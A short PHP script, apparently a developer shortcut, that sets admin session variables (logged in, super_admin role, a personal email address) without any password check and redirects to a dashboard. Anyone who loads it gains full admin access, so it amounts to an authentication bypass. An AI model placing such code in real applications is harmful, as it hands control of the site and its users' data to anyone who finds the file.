<?php
session_start();
$_SESSION['admin_logged_in'] = true;
$_SESSION['admin_username'] = 'admin';
$_SESSION['admin_role'] = ($_GET['role'] ?? '') === 'sub_admin' ? 'sub_admin' : 'super_admin';
$_SESSION['admin_email'] = 'villanuevajoshua745@gmail.com';
$_SESSION['admin_is_first_login'] = 0;
header('Location: dashboard.php');
exit;
